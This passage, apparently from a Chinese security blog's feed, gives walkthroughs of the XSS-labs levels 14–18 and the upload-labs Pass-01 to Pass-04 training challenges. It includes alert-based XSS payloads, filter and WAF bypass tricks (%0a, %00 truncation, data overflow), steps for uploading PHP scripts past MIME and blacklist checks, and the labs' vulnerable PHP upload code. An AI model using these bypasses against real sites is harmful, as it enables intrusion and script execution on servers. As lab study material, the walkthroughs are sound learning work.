src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234015.png" style="zoom:50%;" /><h3 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h3><ul><li><p>通过网上查询能够读取exif信息的网站，并且存在XSS漏洞的进行复现，参考网站：<a href="https://exifdata.com/">https://exifdata.com/</a></p></li><li><p>修改图片的信息，填入测试代码</p></li></ul><p>Windows：右击图片-属性-详细信息。让后进行修改</p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234021.png" style="zoom:50%;" /><ul><li>在网站上进行上传</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234029.png" style="zoom:50%;" /><h2 id="level15（文件包含）"><a href="#level15（文件包含）" class="headerlink" title="level15（文件包含）"></a>level15（文件包含）</h2><h3 id="尝试-14"><a href="#尝试-14" class="headerlink" title="尝试"></a>尝试</h3><ul><li>查看网页源代码</li></ul><p>发现body标签下的<span>的类名为ng-include。所以ng-include就相当于包含一个文件。</p><blockquote><p>ng-include 指令用于包含外部的 HTML 文件。</p><p>包含的内容将作为指定元素的子节点。</p><p>ng-include 属性的值可以是一个表达式，返回一个文件名。</p><p>默认情况下，包含的文件需要包含在同一个域名下。</p></blockquote><blockquote><p>特别值得注意的几点如下：</p><p>1.ng-include,如果单纯指定地址，必须要加引号</p><p>2.ng-include,加载外部html，script标签中的内容不执行</p><p>3.ng-include,加载外部html中含有style标签样式可以识别</p></blockquote><h3 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h3><ul><li>借助后台代码进行审计</li></ul><p>可见后台使用get的方式获取src的参数值，在放到ng-include的后面，并且还对src'进行了过滤</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234035.png"></p><ul><li>由于使用了过滤，不能使用<>，没有自身可利用的属性进行测试，伪协议涉及闭合，也需要<></li><li>因为ng-include是文件包含，可以考虑使用文件包含的方式，包含一个存在XSS漏洞的文件，然后进行攻击。</li></ul><p>这里参考网上资料选择第一关的文件上传，由于第一关需要执行xss代码需要把需要把代码写在name上，直接构造语句就行了。注意需要加引号</p><p>因为过滤了<>，所以使用的是<img>配合onerror来实现的。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">src<span class="token operator">=</span><span class="token string">'level1.php?name=&lt;img src=1 onerror=alert(1)>'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234047.png"></p><h2 id="level16（空格-关键字过滤）"><a href="#level16（空格-关键字过滤）" class="headerlink" title="level16（空格+关键字过滤）"></a>level16（空格+关键字过滤）</h2><h3 id="尝试-15"><a href="#尝试-15" class="headerlink" title="尝试"></a>尝试</h3><ul><li>在url中的keyword的值会显示在页面，通过常规语句的尝试发现，对语句有关键字过滤，对空格也有过滤</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234054.png"></p><h3 id="思路-15"><a href="#思路-15" class="headerlink" title="思路"></a>思路</h3><ul><li><p>浏览器会对url中的非数字进行编码解码</p><blockquote><p>URL编码平时我们是用不到的，因为IE会自动将你输入到地址栏的非数字字母转换为url编码。</p></blockquote></li><li><p>因为后台对url的空格进行url编码，那么就可以通过换行来使参数分开：换行的url编码为：%0a</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234100.png"></p><ul><li>后台代码</li></ul><p>可见后台把关键字都替换成了”&nbsp"</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234106.png"></p><h2 id="level17（插件）"><a href="#level17（插件）" class="headerlink" title="level17（插件）"></a>level17（插件）</h2><h3 id="尝试-16"><a href="#尝试-16" class="headerlink" title="尝试"></a>尝试</h3><blockquote><p><embed> 标签定义了一个容器，用来嵌入外部应用或者互动程序（插件）</p></blockquote><ul><li>发现在url中写的参数都被写进<embed>的src的参数里面了</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234114.png"></p><ul><li>后台对<>有过滤</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234121.png"></p><h3 id="思路-16"><a href="#思路-16" class="headerlink" title="思路"></a>思路</h3><p>尝试使用没有<>的属性，比如onmouseover</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234125.png"></p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>与17关一样</p></script></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全攻防 </tag>
            
            <tag> xss漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传实验</title>
      <link href="/posts/59029.html"/>
      <url>/posts/59029.html</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs"><a href="#upload-labs" class="headerlink" title="upload-labs"></a>upload-labs</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong>实战思路：</strong></p><ul><li>判断中间件的类型，看是否存在解析漏洞</li><li>CMS（公共漏洞和暴露，意思是用了别人的组件，而别人的组件有漏洞）</li><li>编辑器漏洞</li><li>CVE</li></ul><h2 id="1-文件上传漏洞的过滤方式"><a href="#1-文件上传漏洞的过滤方式" class="headerlink" title="1.文件上传漏洞的过滤方式"></a>1.文件上传漏洞的过滤方式</h2><p><span style="background:#00BFFF">#d 对文件上传进行分类</span></p><p>不同的类型文件上传的方式有所不同，对上传漏洞的分类，对不同的漏洞实行不同的方法可以实现高效率准确的上传。</p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220729211126.png" alt="image-20220729211126109" style="zoom:67%;"><p><span style="background:orange">#e 解析类漏洞</span> <span style="background:#00BFFF">对文件上传进行分类</span></p><p>在解析类漏洞中，长传的是php就只能解析php，解析图片就对图片进行解析。拿对图片的解析来解析PHP是不对的。</p><p><span style="background:orange">#e cms和cve</span> <span style="background:#00BFFF"> 对文件上传进行分类</span></p><p>在cms和cve漏洞中有太多的细节，需要参考别人已经实现了的，自己实现起来可能会有大麻烦，因为很多细节不能注意到。</p><h2 id="2-解析漏洞-文件上传"><a href="#2-解析漏洞-文件上传" class="headerlink" title="2.解析漏洞+文件上传"></a>2.解析漏洞+文件上传</h2><p><span style="background:#00BFFF">#d 中间件解析漏洞</span></p><blockquote><p> 文件解析漏洞,是指Web容器（Apache、Nginx、IIS等在服务器一个端口就有一个提供相应服务的程序，而这个程序就是处理从客户端发出的请求。）在解析文件时将文件解析成脚本文件格式并得以执行而产生的漏洞。从而,黑客可以利用该漏洞实现非法文件的解析。</p></blockquote><p>中间件使用特定的方式，使得非脚本文件变成脚本文件执行的情况。</p><p><span style="background:orange">#e Nginx解析漏洞</span> <span style="background:#00BFFF">中间件解析漏洞</span></p><p>在Nginx中在url最后添加”/x.php”一个任意的php文件，会导致把前面的文件当成脚本执行</p><h2 id="3-编辑器漏洞-文件上传"><a href="#3-编辑器漏洞-文件上传" class="headerlink" title="3.编辑器漏洞+文件上传"></a>3.编辑器漏洞+文件上传</h2><p><span style="background:#00BFFF">#d 编辑器漏洞</span></p><p>使用在线的编辑器使得可以上传脚本文件到后台并执行</p><p><span style="background:orange">#e OA系统下的Fckeditor编辑器漏洞</span></p><h2 id="4-文件上传-WAF绕过"><a href="#4-文件上传-WAF绕过" class="headerlink" title="4.文件上传+WAF绕过"></a>4.文件上传+WAF绕过</h2><p><span style="background:#00BFFF">#d 绕过的方法</span></p><p>确定数据包中可以修改的项，不可修改的项。通过更改可修改的项的内容对数据进行修改来绕过waf的过程。</p><blockquote><p>#上传参数名解析：明确哪些东西能修改？ </p><p>Content-Disposition：一般可更改</p><p>name：表单参数值，不能更改</p><p>filename：文件名，可以更改 Content-Type：</p><p>文件 MIME，视情况更改</p></blockquote><p><span style="background:#00BFFF">#d 文件上传的WAF</span></p><blockquote><p><a href="https://www.huaweicloud.com/product/waf.html">WAF</a>工作在web服务器之前，对基于HTTP协议的通信进行检测和识别。在用户请求到达Web服务器前对用户请求进行扫描和过滤，分析并校验每个用户请求的网络包，确保每个用户请求有效且安全，对无效或有攻击行为的请求进行阻断或隔离</p></blockquote><p>对用户发来的请求包进行验证，判断请求包当中有无恶意的代码包。如果有就进行截断，如果没有就放包</p><p><span style="background:orange">#e 绕过安全狗对上传文件的拦截</span> <span style="background:#00BFFF">文件上传的WAF</span></p><p>在本地进行waf的绕过练习，尝试思考waf的验证方式，寻找waf的绕过方式。</p><p><span style="background:#00BFFF">#d 绕过方法</span></p><ul><li><p>数据溢出-防匹配(xxx…)</p><p>通过添加许多无用的数据使得waf验证的数据包被填满</p></li><li><p>符号变异-防匹配（’ “ ;）</p><p>引用编程思想，验证数据的匹配方式</p></li><li><p>数据截断-防匹配(%00 ; 换行) </p><p>换行方式使得waf得到的数据中有\n标准，从而使得验证失败</p></li><li><p>重复数据-防匹配(参数多次</p><p>相同的数据重复多次使得绕过</p></li></ul><h2 id="Pass-01（前端）"><a href="#Pass-01（前端）" class="headerlink" title="Pass-01（前端）"></a>Pass-01（前端）</h2><h3 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>前端：</strong>通过前端的js代码进行验证（防护）。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>方法一：在浏览器禁用js代码，缺点会导致其他正常js代码无法正常使用</li><li>方法二：bp抓包，更改文（filename属性）件后缀名</li><li>方法三：下载html文件，删除相应的js代码</li></ul><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p><strong>方法一：</strong></p><ul><li>在浏览器中禁用js，此时想上传什么类型文件就可以上传什么类型文件了（也就是脚本文件）</li><li>上床成功后右击图片获取图片链接，访问链接就可以查看上传的脚本。</li></ul><p><strong>方法二：</strong></p><ul><li>把编辑好的脚本改成jpg格式，抓取上传的包，修改filename的文件格式为php，即可上传脚本成功。</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232953.png" style="zoom:67%;"><p><strong>方法三：</strong></p><ul><li><p>–右击–查看网页源代码</p></li><li><p>复制网页源代码到一个txt文档中，删除检查的文件类型的js代码</p></li><li><p>通过长传一次正常的图片，右击–检查–网络，可以查看上传到的服务器的地址</p></li><li><p>在<from>标签添加服务器地址到action，（指向何处发送表单数据，即需要发送的服务器的地址）</from></p></li><li><p>把txt文档改成html文档，用浏览器访问进行上传（会出现乱码，但是不影响）</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232954.png"></p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232955.png"></p></li></ul><h2 id="Pass-02（MIME）"><a href="#Pass-02（MIME）" class="headerlink" title="Pass-02（MIME）"></a>Pass-02（MIME）</h2><h3 id="验证方式-1"><a href="#验证方式-1" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端（MIME验证）：</strong>验证文件的MIME信息</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token comment">/*isset -- 检测变量是否设置判断post过来的数据是否被提交过来*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//判断UPLOAD_PATH上传目录是否存在</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//获取临时存储的文件名</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token comment">//上床目录+上传时的文件名           </span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//把临时文件移到UPLOAD_PATH目录</span>                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">/*$_FILES数组内容如下: $_FILES['myFile']['name'] 客户端文件的原名称。 $_FILES['myFile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如"image/gif"。 $_FILES['myFile']['size'] 已上传文件的大小，单位为字节。 $_FILES['myFile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 $_FILES['myFile']['error'] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ul><li>抓包更改content_type为验证的类型</li></ul><h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h3><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232956.png" style="zoom: 50%;"><h2 id="Pass-03（黑名单不全）"><a href="#Pass-03（黑名单不全）" class="headerlink" title="Pass-03（黑名单不全）"></a>Pass-03（黑名单不全）</h2><h3 id="验证方式-2"><a href="#验证方式-2" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端，黑名单的方式（黑名单不全）：</strong>通过指定不能上传的文件类型，在后端提取上传文件的后缀，然后与黑名单进行比对。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.asp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.aspx'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取上传文件的后缀名</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"YmdHis"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'上传出错！'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>在Apache服务器中，在配置文件httpd.conf中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置他是无法解析php5代码的，访问的时候就是一个空白页。可以随便写一个后缀名，入.hhh,那么上传.hhh的文件都会被当成php来执行。</p><p>所以，就是在httpd.com的配置文件中，没有被黑名单限制的后缀。</p><p>在上传的时候抓包，修改filename的文件后缀绕过黑名单限制</p><h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h3><ul><li>配置phpstudy环境</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232957.png" style="zoom:67%;"><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232958.png" style="zoom:67%;"><ul><li>上传php脚本，抓包修改后缀名</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328232959.png" style="zoom:67%;"><ul><li>访问图片链接</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233000.png" style="zoom:67%;"><h2 id="Pass-04（-htaccess）"><a href="#Pass-04（-htaccess）" class="headerlink" title="Pass-04（.htaccess）"></a>Pass-04（.htaccess）</h2><h3 id="验证方式-3"><a href="#验证方式-3" class="headerlink" title="验证方式"></a>验证方式</h3><p><strong>后端：黑名单（黑名单齐全），.htacces解析：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".phtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pht"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp5"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp4"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHp1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Html"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".Htm"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".pHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jsv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jspf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSw"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSv"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jSpf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".jHtml"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aspx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ascx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ashx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".asmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cer"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSp"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSpx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSa"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSax"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aScx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aShx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".aSmx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".cEr"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".sWf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".swf"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".ini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>        